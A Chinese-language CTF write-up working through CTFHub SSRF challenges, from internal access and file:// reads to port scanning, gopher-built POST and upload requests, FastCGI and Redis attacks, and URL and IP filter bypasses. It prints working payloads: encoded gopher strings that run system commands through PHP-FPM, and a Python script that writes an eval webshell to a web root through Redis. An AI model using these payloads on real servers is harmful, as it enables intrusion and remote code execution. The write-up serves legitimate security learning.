# CTFHub-SSRF学习


## 0x00 前言

菜鸡记录汇总下SSRF的学习过程，这个题目设置的难度不合理，后四题贼简单，难度却最高。。。，就离谱。

## 0x01 内网访问

题目：尝试访问位于127.0.0.1的flag.php吧

启动环境，url显示`xxxx/?url=_`，SSRF(Server-SideRequestForgery)是服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。这道题，我们可以指定URL地址从而获取网页文本内容，所以直接改成`127.0.0.1/flag.php`即可。

## 0x02 伪协议读取文件

题目：尝试去读取一下Web目录下的flag.php吧

Web目录的路径是`/var/www/html/`，启动环境，url显示`xxxx/?url=_`，这题的考点应该是利用file协议读取本地文件，改为`file:///var/www/html/flag.php`，出现三个？，查看源代码，即可得到flag。

## 0x03 端口扫描

题目：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦

使用Burp设置`/?url=127.0.0.1:§8000§`，在intruder设置PayLoad Type为number，From：8000To：9000，Step：1。发现在8462端口，长度有明显差异。<figure class="wp-block-image size-large">

<img loading="lazy" width="688" height="236" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-219.png" alt="" class="wp-image-1467" /> </figure> 

## 0x04 POST请求

题目：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年

直接访问flag.php显示，Just View From 127.0.0.1，构造url变量，访问`url/?url=http://127.0.0.1/flag.php`，出现一个输入框，查看源码。<figure class="wp-block-image size-full">

<img loading="lazy" width="526" height="97" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-208.png" alt="" class="wp-image-3153" /> </figure> 

302是重定向又称之为暂时性转移，一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。不过302.php访问不了，不知道为啥。

输入`url?url=file`:`///var/www/html/flag.php`查看下源代码，可以发现需要post一个key值。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-210.png" alt="" class="wp-image-3160" width="446" height="401" /> </figure> 

需要利用gopher协议来构造post请求，post的数据包的格式大致如下：

<pre class="wp-block-code"><code>POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=882ba9ee8557373dce7b058bb80ed9d6</code></pre>

将上面的POST数据包先进行1次URL编码,**URL编码的次数主要取决于你请求的次数**，然后换行符是`%0d%0a`，把%0A替换成%0d%0A，结尾补上%0d%0A。

```
POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=882ba9ee8557373dce7b058bb80ed9d6%0d%0A
```

再进行一次URL编码

```
POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=882ba9ee8557373dce7b058bb80ed9d6%250d%250A
```

最后的利用curl<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-212.png" alt="" class="wp-image-3164" /></figure> 

补充知识：

<pre class="wp-block-code"><code>-v     详细（在事件循环中打印错误/警告）
-vv    非常详细（也打印客户端命令/ reponses ）
-vvv   非常详细（也打印内部状态转换）</code></pre>

## 0x05 上传文件

题目：这次需要上传一个文件到flag.php了.祝你好运。

构造`url?url=http://127.0.0.1/flag.php`<figure class="wp-block-image size-full">

<img loading="lazy" width="209" height="73" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-213.png" alt="" class="wp-image-3168" /> </figure> 

再利用file协议读一下源代码。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-214.png" alt="" class="wp-image-3169" width="457" height="245" /> </figure> 

编辑下html，然后上传一个非空文件。

<pre class="wp-block-code"><code>&lt;form action="/flag.php" method="post" enctype="multipart/form-data"&gt;
    &lt;input type="file" name="file"&gt;
    &lt;input type="submit" value="上传"&gt;
&lt;/form&gt;</code></pre>

利用bp抓包，出现Just View From 127.0.0.1。

<pre class="wp-block-code"><code>POST /flag.php HTTP/1.1
Host: challenge-839040a464e49915.sandbox.ctfhub.com:10800
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------41538798404609826121560554440
Content-Length: 218
Origin: http://challenge-839040a464e49915.sandbox.ctfhub.com:10800
Connection: keep-alive
Referer: http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php
Upgrade-Insecure-Requests: 1

-----------------------------41538798404609826121560554440
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

123
-----------------------------41538798404609826121560554440--
</code></pre>

经过一次url编码，%0A全部替换成%0d%0A

```
POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20challenge-839040a464e49915.sandbox.ctfhub.com:10800%0d%0AUser-Agent:%20Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64;%20rv:91.0)%20Gecko/20100101%20Firefox/91.0%0d%0AAccept:%20text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8%0d%0AAccept-Language:%20zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%0d%0AAccept-Encoding:%20gzip,%20deflate%0d%0AContent-Type:%20multipart/form-data;%20boundary=---------------------------41538798404609826121560554440%0d%0AContent-Length:%20218%0d%0AOrigin:%20http://challenge-839040a464e49915.sandbox.ctfhub.com:10800%0d%0AConnection:%20keep-alive%0d%0AReferer:%20http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php%0d%0AUpgrade-Insecure-Requests:%201%0d%0A%0d%0A-----------------------------41538798404609826121560554440%0d%0AContent-Disposition:%20form-data;%20name=%22file%22;%20filename=%221.txt%22%0d%0AContent-Type:%20text/plain%0d%0A%0d%0A123%0d%0A-----------------------------41538798404609826121560554440--%0d%0A
```

再经过一次url编码

```
POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520challenge-839040a464e49915.sandbox.ctfhub.com:10800%250d%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:91.0)%2520Gecko/20100101%2520Firefox/91.0%250d%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8%250d%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250d%250AAccept-Encoding:%2520gzip,%2520deflate%250d%250AContent-Type:%2520multipart/form-data;%2520boundary=---------------------------41538798404609826121560554440%250d%250AContent-Length:%2520218%250d%250AOrigin:%2520http://challenge-839040a464e49915.sandbox.ctfhub.com:10800%250d%250AConnection:%2520keep-alive%250d%250AReferer:%2520http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php%250d%250AUpgrade-Insecure-Requests:%25201%250d%250A%250d%250A-----------------------------41538798404609826121560554440%250d%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%25221.txt%2522%250d%250AContent-Type:%2520text/plain%250d%250A%250d%250A123%250d%250A-----------------------------41538798404609826121560554440--%250d%250A
```

使用gopher协议访问，成功得到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="755" height="37" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-215.png" alt="" class="wp-image-3173" /> </figure> 

## 0x06 FastCGI协议

题目：这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助

提供了一个附件<a rel="noreferrer noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461" target="_blank" rel="nofollow" >https://blog.csdn.net/mysteryflower/article/details/94386461</a>，这里同样参考了<a href="https://www.soapffz.com/sec/ctf/566.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.soapffz.com/sec/ctf/566.html</a>

**Nginx（IIS7）解析漏洞**

在用户访问 `http://127.0.0.1/favicon.ico/.php` 时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了，而这个指定的文件涉及到的关键变量为 "SCRIPT\_FILENAME"；正常来说，SCRIPT\_FILENAME 的值是一个不存在的文件 /var/www/html/favicon.ico/.php，是 PHP 设置中的一个选项 fix\_pathinfo 导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 fix\_pathinfo，在这个选项被打开的情况下，fpm 会判断 SCRIPT_FILENAME 是否存在，如果不存在则去掉最后一个 / 及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。

**PHP-FPM未授权访问漏洞**

PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。

在fpm某个版本之前，我们可以将`SCRIPT_FILENAME`的值指定为任意后缀文件，比如`/etc/passwd`；但后来，fpm的默认配置中增加了一个选项`security.limit_extensions`：

<pre class="wp-block-code"><code>security.limit_extensions = .php .php3 .php4 .php5 .php7</code></pre>

其限定了只有某些后缀的文件允许被fpm执行，默认是`.php`。所以，当我们再传入`/etc/passwd`的时候，将会返回`Access denied`。

由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。

万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用`find / -name "*.php"`来全局搜索一下默认环境，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如`/usr/local/lib/php/PEAR.php`。

**任意代码执行**

PHP.INI中有两个有趣的配置项，`auto_prepend_file`和`auto_append_file`。`auto_prepend_file`是告诉PHP，在执行目标文件之前，先包含`auto_prepend_file`中指定的文件；`auto_append_file`是告诉PHP，在执行完成目标文件后，包含`auto_append_file`指向的文件。

假设我们设置`auto_prepend_file`为`php://input`，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项`allow_url_include`）

`PHP_VALUE`和`PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。（`disable_functions`除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

环境变量：

<pre class="wp-block-code"><code>{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}</code></pre>

设置`auto_prepend_file = php://input`且`allow_url_include = On`，然后将我们需要执行的代码放在Body中，即可执行任意代码。

EXP：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a>

<pre class="wp-block-code"><code>usage: fpm.py &#91;-h] &#91;-c CODE] &#91;-p PORT] host file</code></pre>

执行命令

<pre class="wp-block-code"><code>python3 fpm.py -c "&lt;?php var_dump(shell_exec('ls /'));?&gt;" -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="969" height="160" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-217.png" alt="" class="wp-image-3186" /> </figure> 

利用hexdump或xxd查看数据流和元数据。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-219.png" alt="" class="wp-image-3189" width="470" height="507" /> </figure> 

提出来后进行url编码

```
gopher://127.0.0.1:9000/_%2501%2501%2542%2549%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2542%2549%2501%25e7%2500%2500%250e%2502%2543%254f%254e%2554%2545%254e%2554%255f%254c%2545%254e%2547%2554%2548%2533%2537%250c%2510%2543%254f%254e%2554%2545%254e%2554%255f%2554%2559%2550%2545%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2574%2565%2578%2574%250b%2504%2552%2545%254d%254f%2554%2545%255f%2550%254f%2552%2554%2539%2539%2538%2535%250b%2509%2553%2545%2552%2556%2545%2552%255f%254e%2541%254d%2545%256c%256f%2563%2561%256c%2568%256f%2573%2574%2511%250b%2547%2541%2554%2545%2557%2541%2559%255f%2549%254e%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252f%2531%252e%2530%250f%250e%2553%2545%2552%2556%2545%2552%255f%2553%254f%2546%2554%2557%2541%2552%2545%2570%2568%2570%252f%2566%2563%2567%2569%2563%256c%2569%2565%256e%2574%250b%2509%2552%2545%254d%254f%2554%2545%255f%2541%2544%2544%2552%2531%2532%2537%252e%2530%252e%2530%252e%2531%250f%251b%2553%2543%2552%2549%2550%2554%255f%2546%2549%254c%2545%254e%2541%254d%2545%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%250b%251b%2553%2543%2552%2549%2550%2554%255f%254e%2541%254d%2545%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%2509%251f%2550%2548%2550%255f%2556%2541%254c%2555%2545%2561%2575%2574%256f%255f%2570%2572%2565%2570%2565%256e%2564%255f%2566%2569%256c%2565%2520%253d%2520%2570%2568%2570%253a%252f%252f%2569%256e%2570%2575%2574%250e%2504%2552%2545%2551%2555%2545%2553%2554%255f%254d%2545%2554%2548%254f%2544%2550%254f%2553%2554%250b%2502%2553%2545%2552%2556%2545%2552%255f%2550%254f%2552%2554%2538%2530%250f%2508%2553%2545%2552%2556%2545%2552%255f%2550%2552%254f%2554%254f%2543%254f%254c%2548%2554%2554%2550%252f%2531%252e%2531%250c%2500%2551%2555%2545%2552%2559%255f%2553%2554%2552%2549%254e%2547%250f%2516%2550%2548%2550%255f%2541%2544%254d%2549%254e%255f%2556%2541%254c%2555%2545%2561%256c%256c%256f%2577%255f%2575%2572%256c%255f%2569%256e%2563%256c%2575%2564%2565%2520%253d%2520%254f%256e%250d%2501%2544%254f%2543%2555%254d%2545%254e%2554%255f%2552%254f%254f%2554%252f%250b%2509%2553%2545%2552%2556%2545%2552%255f%2541%2544%2544%2552%2531%2532%2537%252e%2530%252e%2530%252e%2531%250b%251b%2552%2545%2551%2555%2545%2553%2554%255f%2555%2552%2549%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%2501%2504%2542%2549%2500%2500%2500%2500%2501%2505%2542%2549%2500%2525%2500%2500%253c%253f%2570%2568%2570%2520%2576%2561%2572%255f%2564%2575%256d%2570%2528%2573%2568%2565%256c%256c%255f%2565%2578%2565%2563%2528%2527%256c%2573%2520%252f%2527%2529%2529%253b%253f%253e%2501%2505%2542%2549%2500%2500%2500%2500
```

<img loading="lazy" width="1920" height="50" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-220.png" alt="" class="wp-image-3192" /> </figure> 

利用工具构造<figure class="wp-block-image size-full">

<img loading="lazy" width="1143" height="522" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-221.png" alt="" class="wp-image-3194" /> </figure> 

再进行一次url加密，得到最后的payload。

```
gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%251BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%250D%2501DOCUMENT_ROOT/%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520/flag_3459efb73be0b89b105d41e2f96c6d2c%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

## 0x07 Redis协议

题目：这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!

参考<a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://xz.aliyun.com/t/5665</a>

<pre class="wp-block-code"><code>import urllib
protocol="gopher://"
ip="127.0.0.1"
port="6379"
shell="\n\n&lt;?php eval($_GET&#91;\"cmd\"]);?&gt;\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=&#91;"flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print (payload)</code></pre>

再经过url编码

```
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

执行`url/shell.php?cmd=system('find / -name flag*');`，找到可疑文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="1836" height="78" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-222.png" alt="" class="wp-image-3198" /> </figure> 

cat一下就出来flag了。

## 0x08 URL Bypass

题目：请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧

构造`url?url=http://notfound.ctfhub.com@127.0.0.1/flag.php`

## 0x09 数字IP Bypass

题目：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢

转换成16进制，构造`url?url=0x7f000001/flag.php`

## 0x0A 302跳转 Bypass

题目：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧

先直接构造`url?url=127.0.0.1/flag.php`访问<figure class="wp-block-image size-full">

<img loading="lazy" width="217" height="26" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-216.png" alt="" class="wp-image-3177" /> </figure> 

改成localhost，成功。

## 0x0B DNS重绑定 Bypass

关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助

提供了一个附件：<a href="https://zhuanlan.zhihu.com/p/89426041" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://zhuanlan.zhihu.com/p/89426041</a>

答案参考附件就出来了。
